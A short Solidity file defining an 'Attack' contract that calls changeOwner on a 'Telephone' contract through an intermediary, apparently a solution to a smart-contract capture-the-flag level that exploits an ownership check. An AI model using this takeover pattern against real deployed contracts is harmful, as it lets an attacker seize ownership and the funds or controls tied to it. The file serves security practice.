// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    Telephone telephone;
    constructor(address addr) {
        telephone=Telephone(addr);
    }
    function attack() public {
        telephone.changeOwner(0x285ac9F8881D867556fCf6C16F26e3629F86C971);
    }
}
